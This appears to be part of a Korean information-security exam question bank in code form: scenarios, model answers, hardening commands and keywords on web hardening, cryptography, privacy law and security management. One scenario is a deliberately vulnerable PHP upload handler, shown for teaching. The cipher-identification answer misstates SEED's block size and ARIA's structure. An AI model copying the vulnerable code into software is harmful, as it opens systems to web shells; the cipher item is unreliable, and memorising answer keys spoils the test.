      "보안 문제 및 권장 설정: 1) register_globals = Off: 전역변수 등록으로 변수 조작 가능. 2) allow_url_fopen = Off: 원격 파일 접근으로 RFI 공격 가능. 3) allow_url_include = Off: 원격 파일 포함(Remote File Inclusion) 공격 방지. 4) display_errors = Off: 에러 메시지로 내부 정보 노출 방지. 5) expose_php = Off: HTTP 응답에 PHP 버전 정보 노출 방지. 6) session.cookie_httponly = On: JavaScript에서 세션 쿠키 접근 차단(XSS 방어). 7) session.cookie_secure = On: HTTPS에서만 쿠키 전송. 8) upload_max_filesize는 필요한 최소값으로 제한.",
    command: `register_globals = Off
allow_url_fopen = Off
allow_url_include = Off
display_errors = Off
expose_php = Off
session.cookie_httponly = On
session.cookie_secure = On`,
    keywords: [
      "php.ini",
      "register_globals",
      "allow_url_include",
      "RFI",
      "보안 설정",
    ],
    subject: "application-security",
  },
  {
    question:
      "다음 HTTP 응답 헤더를 분석하고, 누락된 보안 헤더와 권장 설정값을 제시하시오.",
    scenario: `HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123; path=/`,
    answer:
      "문제점: 1) Server 헤더에 상세 버전 노출. 2) X-Powered-By 헤더에 PHP 버전 노출. 3) 쿠키에 HttpOnly, Secure, SameSite 속성 누락. 추가 필요한 보안 헤더: X-Frame-Options: DENY (클릭재킹 방지), X-Content-Type-Options: nosniff (MIME 스니핑 방지), X-XSS-Protection: 1; mode=block (XSS 필터), Strict-Transport-Security: max-age=31536000; includeSubDomains (HSTS), Content-Security-Policy: default-src 'self' (CSP), Set-Cookie에 HttpOnly; Secure; SameSite=Strict 추가.",
    command: `Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Content-Security-Policy "default-src 'self'"`,
    keywords: [
      "보안 헤더",
      "X-Frame-Options",
      "CSP",
      "HSTS",
      "HttpOnly",
      "Secure",
    ],
    subject: "application-security",
  },
  {
    question:
      "다음 파일 업로드 코드에서 취약점을 찾고 안전한 코드로 수정하시오.",
    scenario: `<?php
$target_dir = "/var/www/html/uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
echo "파일이 업로드되었습니다: " . $target_file;
?>`,
    answer:
      "취약점: 1) 파일 확장자 검증 없음: .php, .jsp 등 실행 가능한 파일 업로드 시 웹쉘 실행 가능. 2) 파일 크기 제한 없음. 3) 파일명을 그대로 사용하여 경로 조작 가능. 수정: 허용 확장자 화이트리스트 검증, 파일 크기 제한, 파일명을 랜덤값으로 변경, MIME 타입 검증, 업로드 디렉터리 실행 권한 제거가 필요하다.",
    command: `$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) { die("허용되지 않는 파일 형식"); }
if ($_FILES["file"]["size"] > 5 * 1024 * 1024) { die("파일 크기 초과"); }
$new_name = bin2hex(random_bytes(16)) . "." . $ext;
move_uploaded_file($_FILES["file"]["tmp_name"], $target_dir . $new_name);`,
    keywords: ["파일 업로드", "웹쉘", "확장자 검증", "화이트리스트"],
    subject: "application-security",
  },
  {
    question:
      "다음 robots.txt 파일을 분석하고 보안상 문제점을 서술하시오.",
    scenario: `User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /config/database.yml
Disallow: /internal/api/
Disallow: /phpMyAdmin/
Allow: /`,
    answer:
      "보안 문제: robots.txt에 민감한 경로 정보가 노출되어 있다. 관리자 페이지(/admin/), 백업 디렉터리(/backup/), 데이터베이스 설정 파일(/config/database.yml), 내부 API(/internal/api/), phpMyAdmin 경로가 공개되어 있다. robots.txt는 검색엔진 크롤러를 위한 것이지 접근 제어 수단이 아니므로, 공격자가 이를 통해 민감한 경로를 파악할 수 있다. 대응: 민감한 경로는 robots.txt에 기재하지 말고, 인증과 접근 제어를 통해 보호해야 한다.",
    keywords: ["robots.txt", "정보 노출", "디렉터리 구조", "보안 설정"],
    subject: "application-security",
  },
  {
    question:
      "다음 SQL 권한 관리 명령어를 분석하고, webuser 계정에 특정 테이블의 SELECT, INSERT 권한만 부여하는 명령어를 작성하시오.",
    scenario: `GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' IDENTIFIED BY 'password123';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;`,
    answer:
      "분석: 1) admin에게 모든 데이터베이스의 모든 권한을 모든 호스트에서 접속 허용 - 매우 위험하다. 비밀번호도 취약하다. 2) appuser에게 mydb의 SELECT, INSERT, UPDATE, DELETE 권한을 localhost에서만 부여. 보안 권장: admin 계정의 접속 호스트를 제한하고 강력한 비밀번호를 사용해야 한다. webuser에 권한 부여: GRANT SELECT, INSERT ON mydb.users TO 'webuser'@'localhost'; FLUSH PRIVILEGES;",
    command: `GRANT SELECT, INSERT ON mydb.users TO 'webuser'@'localhost';
FLUSH PRIVILEGES;`,
    keywords: ["GRANT", "REVOKE", "SQL 권한", "최소 권한 원칙", "데이터베이스 보안"],
    subject: "application-security",
  },

  // ========================================
  // 4. 정보보안 일반 (security-general) ~8문제
  // ========================================
  {
    question:
      "RSA 암호에서 p=7, q=11일 때, 공개키 e=13에 대한 개인키 d를 구하시오.",
    scenario: `주어진 값:
- 소수 p = 7, q = 11
- n = p × q = 77
- φ(n) = (p-1)(q-1) = 6 × 10 = 60
- 공개키 e = 13 (gcd(13, 60) = 1 확인)
- 개인키 d = ? (e × d ≡ 1 mod φ(n))`,
    answer:
      "d = 37. e × d ≡ 1 mod 60이므로 13 × d ≡ 1 mod 60을 만족하는 d를 구한다. 13 × 37 = 481 = 8 × 60 + 1이므로 481 mod 60 = 1. 따라서 d = 37이다. 암호화: C = M^e mod n = M^13 mod 77, 복호화: M = C^d mod n = C^37 mod 77.",
    keywords: ["RSA", "공개키", "개인키", "오일러 피 함수", "모듈러 역원"],
    subject: "security-general",
  },
  {
    question:
      "다음 시나리오에서 파일의 무결성이 훼손되었는지 판단하시오.",
    scenario: `[배포 시점]
$ sha256sum important_update.exe
a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  important_update.exe

[다운로드 후]
$ sha256sum important_update.exe
a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  important_update.exe

[한 달 후 재검증]
$ sha256sum important_update.exe
ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00  important_update.exe`,
    answer:
      "배포 시점과 다운로드 후의 SHA-256 해시값이 동일하므로 다운로드 시점에는 무결성이 유지되었다. 그러나 한 달 후 재검증 시 해시값이 변경되었으므로 파일의 무결성이 훼손되었다. 파일이 변조되었을 가능성이 높으며, 악성코드 감염, 무단 수정 등이 원인일 수 있다. SHA-256은 충돌 저항성이 높은 해시 함수로, 1비트만 변경되어도 완전히 다른 해시값이 생성된다.",
    command: "sha256sum important_update.exe",
    keywords: ["SHA-256", "해시", "무결성", "해시 함수", "변조 탐지"],
    subject: "security-general",
  },
  {
    question:
      "전자서명의 서명 생성 및 검증 과정을 다음 시나리오를 바탕으로 설명하시오.",
    scenario: `[송신자 A의 서명 생성]
1. 원본 메시지 M에 해시 함수 적용 → H(M)
2. H(M)을 송신자 A의 (  ①  )로 암호화 → 전자서명 S
3. 메시지 M과 전자서명 S를 수신자 B에게 전송

[수신자 B의 서명 검증]
4. 전자서명 S를 송신자 A의 (  ②  )로 복호화 → H'(M)
5. 수신한 메시지 M에 동일한 해시 함수 적용 → H(M)
6. H'(M)과 H(M)을 비교하여 일치 여부 확인`,
    answer:
      "① 개인키(Private Key), ② 공개키(Public Key). 전자서명은 송신자의 개인키로 서명(암호화)하고, 수신자는 송신자의 공개키로 검증(복호화)한다. 이를 통해 무결성(메시지 변조 여부), 인증(송신자 확인), 부인 방지(송신 사실 부인 불가)를 보장한다. H'(M)과 H(M)이 일치하면 서명이 유효하고 메시지가 변조되지 않았음을 의미한다.",
    keywords: ["전자서명", "개인키", "공개키", "해시", "부인 방지"],
    subject: "security-general",
  },
  {
    question:
      "다음 openssl 명령어의 실행 결과를 분석하고 인증서 정보를 해석하시오.",
    scenario: `$ openssl x509 -in server.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1234567890
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = KR, O = KISA, CN = KISA RootCA
        Validity
            Not Before: Jan  1 00:00:00 2025 GMT
            Not After : Dec 31 23:59:59 2025 GMT
        Subject: C = KR, O = Example Corp, CN = www.example.co.kr
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)`,
    answer:
      "인증서 분석: X.509 v3 인증서이며, 서명 알고리즘은 SHA-256 with RSA이다. 발급기관(Issuer)은 KISA RootCA이고, 유효기간은 2025년 1월 1일부터 2025년 12월 31일까지이다. 소유자(Subject)는 Example Corp의 www.example.co.kr이며, RSA 2048비트 공개키를 사용한다. 현재 날짜(2026년 4월)를 기준으로 이 인증서는 만료된 상태이므로 갱신이 필요하다.",
    command: "openssl x509 -in server.crt -text -noout",
    keywords: ["X.509", "인증서", "openssl", "PKI", "유효기간"],
    subject: "security-general",
  },
  {
    question:
      "다음 접근통제 행렬을 분석하고, 벨-라파듈라(BLP) 모델 위반 여부를 판단하시오.",
    scenario: `접근통제 행렬:
           | 기밀문서(Secret) | 일반문서(Unclassified) |
비밀(Secret) 사용자 |    Read, Write   |      Read, Write      |
일반(Unclassified) 사용자 |      Read       |      Read, Write      |`,
    answer:
      "벨-라파듈라(BLP) 모델 위반이 발생한다. BLP의 두 가지 규칙: 1) No Read Up(단순 보안 규칙): 자신의 등급보다 높은 등급의 정보를 읽을 수 없다. → 일반 사용자가 기밀문서를 Read하고 있어 위반. 2) No Write Down(*-속성): 자신의 등급보다 낮은 등급에 쓸 수 없다. → 비밀 사용자가 일반문서에 Write하고 있어 위반(기밀 정보가 하위 등급으로 유출될 수 있음).",
    keywords: ["벨-라파듈라", "BLP", "접근통제", "No Read Up", "No Write Down"],
    subject: "security-general",
  },
  {
    question:
      "다음 암호 알고리즘의 특성을 보고 알고리즘 이름을 식별하시오.",
    scenario: `알고리즘 A: 블록 크기 64비트, 키 길이 56비트, 16라운드 Feistel 구조
알고리즘 B: 블록 크기 128비트, 키 길이 128/192/256비트, SPN 구조
알고리즘 C: 블록 크기 128비트, 키 길이 128/192/256비트, Feistel 구조, 한국 표준
알고리즘 D: 블록 크기 64비트, 키 길이 128비트, Feistel 구조, 한국 표준`,
    answer:
      "A: DES (Data Encryption Standard) - 64비트 블록, 56비트 키, 16라운드 Feistel. B: AES (Advanced Encryption Standard) - 128비트 블록, 가변 키 길이, SPN 구조. C: ARIA - 128비트 블록, 가변 키 길이, Feistel 기반 SPN 구조(정확히는 Involutional SPN), 한국 국가표준. D: SEED - 64비트 블록(SEED-128) 또는 128비트 블록(SEED-256), 128비트 키, Feistel 구조, 한국 표준.",
    keywords: ["DES", "AES", "ARIA", "SEED", "블록 암호", "대칭키"],
    subject: "security-general",
  },
  {
    question:
      "HMAC의 계산 과정을 다음 시나리오를 바탕으로 설명하시오.",
    scenario: `HMAC(K, M) = H((K' ⊕ opad) || H((K' ⊕ ipad) || M))

주어진 값:
- 해시 함수 H: SHA-256 (블록 크기 64바이트)
- 키 K: "secret_key" (10바이트)
- 메시지 M: "Hello, World!"
- ipad: 0x36을 64바이트 반복
- opad: 0x5C를 64바이트 반복`,
    answer:
      "HMAC 계산 과정: 1) 키 패딩: K(10바이트)가 블록 크기(64바이트)보다 짧으므로 오른쪽에 0x00을 54바이트 패딩하여 K'(64바이트) 생성. 2) 내부 해시: K' ⊕ ipad 계산 후 메시지 M을 붙여 SHA-256 해시 → 내부 해시값. 3) 외부 해시: K' ⊕ opad 계산 후 내부 해시값을 붙여 SHA-256 해시 → 최종 HMAC 값. HMAC은 메시지 인증코드(MAC)로 무결성과 인증을 동시에 제공한다.",
    keywords: ["HMAC", "SHA-256", "메시지 인증코드", "ipad", "opad"],
    subject: "security-general",
  },
  {
    question:
      "Diffie-Hellman 키 교환에서 공개 파라미터 p=23, g=5이고, A의 비밀값 a=6, B의 비밀값 b=15일 때, 공유 비밀키를 계산하시오.",
    scenario: `공개 파라미터: p = 23, g = 5
A의 비밀값: a = 6
B의 비밀값: b = 15

1단계: A가 공개값 계산 → A_pub = g^a mod p = ?
2단계: B가 공개값 계산 → B_pub = g^b mod p = ?
3단계: A가 공유키 계산 → S = B_pub^a mod p = ?
4단계: B가 공유키 계산 → S = A_pub^b mod p = ?`,
    answer:
      "1단계: A_pub = 5^6 mod 23 = 15625 mod 23 = 8. 2단계: B_pub = 5^15 mod 23 = 19(5^15 mod 23 계산). 3단계: A가 계산하는 공유키 S = 19^6 mod 23 = 2. 4단계: B가 계산하는 공유키 S = 8^15 mod 23 = 2. 양쪽이 동일한 공유 비밀키 S = 2를 얻는다. 이것이 Diffie-Hellman 키 교환의 원리이며, 공개 채널에서 비밀키를 교환하지 않고도 동일한 공유키를 생성할 수 있다.",
    keywords: ["Diffie-Hellman", "키 교환", "이산대수", "공유 비밀키"],
    subject: "security-general",
  },

  // ========================================
  // 5. 정보보안 관리 및 법규 (security-management) ~8문제
  // ========================================
  {
    question:
      "다음 개인정보 수집 동의서에서 법적 문제점을 찾고 수정 방안을 제시하시오.",
    scenario: `[개인정보 수집·이용 동의서]

수집 항목: 성명, 주민등록번호, 연락처, 이메일, 취미, 종교, 건강정보, 신용카드번호
수집 목적: 서비스 제공 및 마케팅 활용
보유 기간: 영구 보관
동의 방식: [전체 동의] 체크박스 1개

※ 동의하지 않으시면 서비스 이용이 불가합니다.`,
    answer:
      "법적 문제점: 1) 주민등록번호 수집 금지: 개인정보보호법 제24조의2에 따라 법령에 근거 없이 주민등록번호 수집 불가. 2) 민감정보(종교, 건강정보) 별도 동의 필요: 제23조에 따라 민감정보는 별도 명시적 동의 필요. 3) 필수/선택 구분 누락: 취미 등 선택항목을 분리해야 함. 4) 보유 기간이 '영구'는 부적절: 목적 달성 시 지체 없이 파기해야 함. 5) 동의 번들링 금지: 마케팅 동의는 선택 동의로 분리해야 함. 6) 선택 동의 거부 시 서비스 거부 불가.",
    keywords: [
      "개인정보보호법",
      "동의",
      "필수/선택",
      "민감정보",
      "주민등록번호",
    ],
    subject: "security-management",
  },
  {
    question:
      "다음 정보를 바탕으로 위험도를 계산하고 위험 처리 방안을 제시하시오.",
    scenario: `[위험 분석 결과]
자산: 고객 데이터베이스 서버
자산 가치(AV): 5 (5점 척도)
위협 빈도(T): 4 (5점 척도, 외부 해킹 시도)
취약성(V): 3 (5점 척도, 미패치 취약점 존재)

위험도 = 자산가치(AV) × 위협(T) × 취약성(V)
허용 가능 위험 수준: 30`,
    answer:
      "위험도 = 5 × 4 × 3 = 60. 허용 가능 위험 수준(30)을 초과하므로 위험 처리가 필요하다. 위험 처리 방안: 1) 위험 감소(Mitigation): 보안 패치 적용, 침입 탐지 시스템 도입, 접근 통제 강화로 취약성을 낮춘다. 2) 위험 전가(Transfer): 사이버 보험 가입으로 잔여 위험을 전가한다. 3) 위험 회피(Avoidance): 해당 시스템의 인터넷 노출을 제거한다. 4) 위험 수용(Acceptance): 잔여 위험이 허용 수준 이하가 될 때까지 조치 후 수용.",
    keywords: ["위험 분석", "위험도 계산", "위험 처리", "자산 가치", "취약성"],
    subject: "security-management",
  },
  {
    question:
      "다음 데이터에 적용할 수 있는 비식별 처리 기법을 각각 제시하시오.",
    scenario: `원본 데이터:
| 이름   | 나이 | 주소             | 전화번호        | 병명       |
|--------|------|------------------|-----------------|------------|
| 홍길동 | 35   | 서울시 강남구 역삼동 123-4 | 010-1234-5678  | 고혈압     |
| 김영희 | 28   | 부산시 해운대구 우동 456-7 | 010-9876-5432  | 당뇨병     |`,
    answer:
      "비식별 처리 기법: 1) 가명처리(Pseudonymization): 이름을 '홍OO', '김OO' 또는 임의 코드로 대체. 2) 총계처리(Aggregation): 나이를 '30대', '20대'로 범주화. 3) 데이터 삭제(Data Reduction): 상세 주소를 '서울시 강남구'로 일반화 또는 삭제. 4) 데이터 마스킹(Masking): 전화번호를 '010-****-5678'로 마스킹. 5) 범주화(Generalization): 병명을 '만성질환'으로 일반화. k-익명성, l-다양성, t-근접성 등의 프라이버시 모델을 적용하여 재식별 위험을 평가해야 한다.",
    keywords: [
      "비식별 처리",
      "가명처리",
      "마스킹",
      "k-익명성",
      "개인정보보호",
    ],
    subject: "security-management",
  },
  {
    question:
      "다음 BCP(업무연속성계획) 시나리오에서 RPO와 RTO를 산정하고, 적절한 복구 전략을 제시하시오.",
    scenario: `[시나리오]
- 서비스: 온라인 쇼핑몰 (일 매출 5억원)
- 데이터 백업: 매일 새벽 3시 전체 백업 수행
- 장애 발생 시각: 오후 2시 (서버 하드웨어 장애)
- 비즈니스 요구사항: 최대 4시간 내 서비스 복구 필요
- 허용 가능 데이터 손실: 최근 1시간 이내 데이터까지 복구 필요`,
    answer:
      "RPO(Recovery Point Objective, 복구 목표 시점) = 1시간. 최근 1시간 이내 데이터까지 복구해야 하므로 현재 매일 1회 전체 백업으로는 RPO를 충족할 수 없다(장애 발생 시 최대 23시간 데이터 손실 가능). RTO(Recovery Time Objective, 복구 목표 시간) = 4시간. 복구 전략: 1) RPO 충족: 실시간 데이터 복제(미러링) 또는 최소 1시간 간격 증분 백업 도입. 2) RTO 충족: Hot Site 또는 Warm Site 구축, 자동 장애 조치(Failover) 시스템 도입.",
    keywords: ["BCP", "RPO", "RTO", "업무연속성", "재해복구", "백업"],
    subject: "security-management",
  },
  {
    question:
      "다음 보안 감사 로그를 분석하고 발견된 보안 위반 사항을 식별하시오.",
    scenario: `[접근 로그 - 인사DB]
2026-04-05 23:45:12 user=admin action=LOGIN ip=218.145.33.12 result=SUCCESS
2026-04-05 23:45:30 user=admin action=SELECT table=employee_salary result=SUCCESS rows=15000
2026-04-05 23:46:01 user=admin action=EXPORT table=employee_salary format=CSV result=SUCCESS
2026-04-05 23:47:15 user=admin action=SELECT table=personal_info result=SUCCESS rows=15000
2026-04-05 23:47:45 user=admin action=EXPORT table=personal_info format=CSV result=SUCCESS
2026-04-05 23:48:00 user=admin action=LOGOUT`,
    answer:
      "보안 위반 사항: 1) 비정상 접속 시간: 심야 시간(23:45)에 인사DB 접근 발생. 2) 외부 IP 접속: 외부 IP(218.145.33.12)에서 중요 DB에 직접 접근. 3) 대량 데이터 조회: 급여 테이블과 개인정보 테이블에서 전체 데이터(15,000건) 조회. 4) 대량 데이터 반출: CSV 형태로 대량 데이터 내보내기(Export) 수행. 5) 개인정보 유출 의심: 급여 및 개인정보를 일괄 다운로드하는 행위는 내부정보 유출 가능성이 높다. 즉시 해당 계정 비활성화 및 사고 조사 필요.",
    keywords: ["감사 로그", "내부 정보 유출", "이상 행위", "접근 통제"],
    subject: "security-management",
  },
  {
    question:
      "다음 개인정보 유출 시나리오에서 법적 대응 절차를 순서대로 서술하시오.",
    scenario: `[유출 사고 개요]
- 발생 일시: 2026년 4월 5일 14:00
- 유출 경위: SQL Injection 공격으로 고객 DB 탈취
- 유출 항목: 이름, 이메일, 암호화된 비밀번호, 주소 (총 50,000건)
- 발견 일시: 2026년 4월 6일 09:00`,
    answer:
      "개인정보보호법 제34조에 따른 대응 절차: 1) 유출 확인 즉시: 추가 유출 방지를 위한 긴급 조치(해당 시스템 격리, 취약점 패치). 2) 72시간 이내: 개인정보보호위원회 또는 한국인터넷진흥원(KISA)에 신고(1,000명 이상 유출 시 의무). 3) 정보주체에게 지체 없이 통지: 유출된 개인정보 항목, 유출 시점, 피해 최소화 방법, 대응 조치, 담당부서 연락처를 통지. 4) 1,000명 이상 유출 시 홈페이지 등에 7일 이상 게재. 5) 피해 구제 절차 마련 및 재발 방지 대책 수립.",
    keywords: [
      "개인정보 유출",
      "유출 통지",
      "72시간",
      "개인정보보호법",
      "KISA 신고",
    ],
    subject: "security-management",
  },
  {
    question:
      "다음 ISMS-P 인증 심사 시나리오에서 부적합 사항을 식별하시오.",
    scenario: `[심사 결과 - A기업]
1. 정보보호 정책이 2023년에 수립되었으나 이후 갱신되지 않음
2. 서버실 출입 통제 시스템 운영 중이나 출입 기록이 3개월만 보관됨
3. 퇴직자 계정이 퇴직 후 6개월이 지나도 삭제되지 않음
4. 개인정보 처리 방침이 홈페이지에 게시되어 있음
5. 정보보호 교육을 연 1회 실시하고 있으나 교육 이수 기록이 없음
6. 침해사고 대응 절차서가 수립되어 있으나 모의훈련을 실시한 적이 없음`,
    answer:
      "부적합 사항: 1) 정보보호 정책 미갱신: 연 1회 이상 정기적으로 검토 및 갱신해야 한다. 2) 출입 기록 보관 기간 부족: 관련 법령에 따라 최소 1년 이상 보관 필요(개인정보보호법 시행령). 3) 퇴직자 계정 미삭제: 인사 변동 시 지체 없이 접근 권한 회수 및 계정 삭제 필요. 4) 적합 - 개인정보 처리방침 공개 의무 충족. 5) 교육 이수 기록 미관리: 교육 실시 증적(출석부, 이수 기록) 관리 필요. 6) 침해사고 모의훈련 미실시: 연 1회 이상 모의훈련을 실시하고 결과를 기록해야 한다.",
    keywords: ["ISMS-P", "인증 심사", "부적합", "정보보호 관리체계"],
    subject: "security-management",
  },
  {
    question:
      "다음 정보보호 정책 문서의 미흡한 부분을 찾고 보완 사항을 제시하시오.",
    scenario: `[정보보호 정책서 - B기업]
1. 목적: 회사 정보자산을 보호한다.
2. 적용 범위: 전 직원
3. 패스워드 정책: 최소 6자리 이상
4. 접근 통제: 업무 필요시 관리자에게 구두 요청
5. 백업 정책: 필요시 수행
6. 사고 대응: 보안사고 발생 시 팀장에게 보고
7. 교육: 신입사원 입사 시 교육
8. 위반 시 제재: 없음`,
    answer:
      "보완 사항: 1) 패스워드 정책: 최소 8자리 이상, 영문 대소문자+숫자+특수문자 조합, 90일마다 변경, 최근 사용한 패스워드 재사용 금지로 강화. 2) 접근 통제: 서면 또는 전자적 접근 권한 신청/승인 절차 수립, 최소 권한 원칙 명시. 3) 백업 정책: 백업 주기, 보관 기간, 복구 테스트 절차 구체적으로 명시. 4) 사고 대응: 보안사고 대응 체계(CERT), 보고 경로, 보존 증거, 대외 기관 보고 절차 명시. 5) 교육: 전 직원 대상 연 1회 이상 정기 교육 명시. 6) 위반 시 제재: 징계 규정 마련 필수. 7) 적용 범위: 외부 위탁업체, 임시직 등도 포함.",
    keywords: ["정보보호 정책", "패스워드 정책", "접근 통제", "백업", "교육"],
    subject: "security-management",
  },
];
